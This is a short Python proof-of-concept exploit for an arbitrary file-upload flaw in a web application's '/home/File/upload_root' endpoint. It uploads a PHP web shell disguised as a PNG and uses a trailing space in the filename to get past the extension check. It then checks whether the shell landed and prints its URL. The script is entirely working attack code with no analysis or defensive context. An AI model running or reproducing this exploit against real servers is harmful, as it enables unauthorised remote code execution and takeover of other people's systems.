import sys
import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def poc(target):
	vul=target+'/public/index.php/home/File/upload_root'
	try:
		files={
		'download':('1ight0.php ',open('shell.php','rb'),'image/png')
		}
		res=requests.post(url=vul,files=files,timeout=3,verify=False).text
		jsonres=json.loads(res)
		shellpath=target+'/public/uploads/download'+jsonres['savepath']+jsonres['savename'].strip()
		if requests.get(url=shellpath,timeout=3,verify=False).status_code == 200:
			print('shell-----> ',shellpath)
	except Exception as e:
		print('目标不存在漏洞')

if __name__ == '__main__':
	try:
		target=sys.argv[1]
		if 'http' not in target:
			target='http://'+target
		poc(target)
	except Exception as e:
		print('python poc.py 目标')
